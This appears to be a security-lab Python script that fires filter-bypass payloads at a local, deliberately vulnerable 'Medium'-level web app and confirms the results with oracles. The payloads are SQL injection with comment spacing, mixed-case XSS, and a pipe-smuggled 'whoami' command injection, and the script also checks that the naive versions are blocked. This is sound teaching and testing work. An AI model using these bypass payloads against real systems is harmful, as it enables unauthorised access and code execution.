"""Part A: HTTP attacks against the local Medium wrapper, with seclab oracles."""

import csv
import json
import sys
from html.parser import HTMLParser
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
REPO_ROOT = ROOT.parents[2]  

sys.path.insert(0, str(ROOT))      
sys.path.insert(0, str(REPO_ROOT))  
from lab import get, original, post, safe_request, serve  # noqa: E402
from seclab.attack import Payload, run_payloads  # noqa: E402

SQLI = "admin'/**/OR/**/'1'='1"
XSS = "<ScRiPt>alert(1)</ScRiPt>"
CMDI = "127.0.0.1|whoami"


class ScriptParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.in_script = False
        self.script_seen = False
        self.script_content = ""

    def handle_starttag(self, tag, attrs):
        if tag == "script":
            self.in_script = True
            self.script_seen = True

    def handle_data(self, data):
        if self.in_script:
            self.script_content += data

    def handle_endtag(self, tag):
        if tag == "script":
            self.in_script = False


def sqli_oracle(payload, response):
    status, body = response
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return False, "invalid JSON"
    leaked = status == 200 and data.get("ok") is True and any(
        row[0] == "admin" and row[1] == original.CANARY_SECRET
        for row in data.get("rows", [])
    )
    return leaked, "admin canary row returned" if leaked else "no canary"


def xss_oracle(payload, response):
    status, body = response
    parser = ScriptParser()
    parser.feed(body)
    hit = status == 200 and parser.script_seen and "alert(1)" in parser.script_content
    return hit, "HTML parser found live script element" if hit else "no script element"


def cmdi_oracle(payload, response):
    status, body = response
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return False, "invalid JSON"
    hit = (status == 200 and data.get("injection_detected") is True
           and "|whoami" in data.get("would_run", ""))
    return hit, "pipe reached simulated command context" if hit else "no metachar effect"


def main():
    records = []
    with serve(medium=True) as base:
        cases = [
            ("sqli", Payload(SQLI, "admin canary leak", "sqli"),
             lambda text: safe_request(post, base, "/login", "user", text), sqli_oracle),
            ("xss", Payload(XSS, "unescaped script element", "xss"),
             lambda text: safe_request(get, base, "/", text), xss_oracle),
            ("cmdi", Payload(CMDI, "shell metacharacter context", "cmdi"),
             lambda text: safe_request(post, base, "/ping", "host", text), cmdi_oracle),
        ]
        for family, payload, sender, oracle in cases:
            finding = run_payloads([payload], send=sender, oracle=oracle, trials=3)[0]
            records.append({"family": family, "payload": payload.text,
                            "successes": finding.successes, "trials": finding.trials,
                            "confirmed": finding.confirmed, "evidence": finding.evidence})
            print(f"{family}: {finding.successes}/{finding.trials} {finding.evidence}")
            assert finding.successes == 3, (family, finding.error)

        controls = [
            ("medium_sqli_block", "admin' OR '1'='1", "/login", "user", 403),
            ("medium_xss_block", "<script>alert(1)</script>", "/", "name", 403),
            ("medium_cmdi_block", "127.0.0.1;whoami", "/ping", "host", 403),
        ]
        for label, payload, path, field, expected in controls:
            status, _ = safe_request(get, base, path, payload) if path == "/" else \
                        safe_request(post, base, path, field, payload)
            print(f"{label}: HTTP {status}")
            assert status == expected
        assert not sqli_oracle(None, safe_request(post, base, "/login", "user", "alice"))[0]
        assert not xss_oracle(None, safe_request(get, base, "/safe", XSS))[0]
        assert not cmdi_oracle(None, safe_request(post, base, "/ping", "host", "example.com"))[0]

    out = ROOT / "attack" / "results.csv"
    with out.open("w", newline="", encoding="utf-8") as file:
        writer = csv.DictWriter(file, fieldnames=list(records[0]))
        writer.writeheader()
        writer.writerows(records)
    print(f"Saved {out}")


if __name__ == "__main__":
    main()
